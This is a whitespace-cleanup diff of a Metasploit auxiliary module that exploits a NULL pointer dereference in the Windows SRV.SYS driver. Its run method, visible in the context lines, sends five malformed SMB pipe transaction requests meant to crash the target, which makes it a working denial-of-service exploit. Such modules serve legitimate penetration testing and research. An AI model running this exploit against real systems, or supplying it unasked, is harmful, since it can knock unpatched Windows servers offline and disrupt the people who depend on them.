@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -19,14 +19,14 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Auxiliary::Dos
 
 	def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'           => 'Microsoft SRV.SYS Pipe Transaction No Null',
 			'Description'    => %q{
 				This module exploits a NULL pointer dereference flaw in the
 			SRV.SYS driver of the Windows operating system. This bug was
 			independently discovered by CORE Security and ISS.
 			},
-			
+
 			'Author'         => [ 'hdm' ],
 			'License'        => MSF_LICENSE,
 			'Version'        => '$Revision$',
@@ -38,7 +38,7 @@ class Metasploit3 < Msf::Auxiliary
 					['BID', '19215'],
 				]
 		))
-		
+
 	end
 
 	def run
@@ -52,11 +52,11 @@ class Metasploit3 < Msf::Auxiliary
 			1.upto(5) do |i|
 				print_status("Sending bad SMB transaction request #{i}...");
 				self.simple.client.trans_nonull(
-					"\\#{Rex::Text.rand_text_alphanumeric(rand(16)+1)}", 
-					'', 
-					Rex::Text.rand_text_alphanumeric(rand(16)+1), 
-					3, 
-					[1,0,1].pack('vvv'), 
+					"\\#{Rex::Text.rand_text_alphanumeric(rand(16)+1)}",
+					'',
+					Rex::Text.rand_text_alphanumeric(rand(16)+1),
+					3,
+					[1,0,1].pack('vvv'),
 					true
 				)
 			end
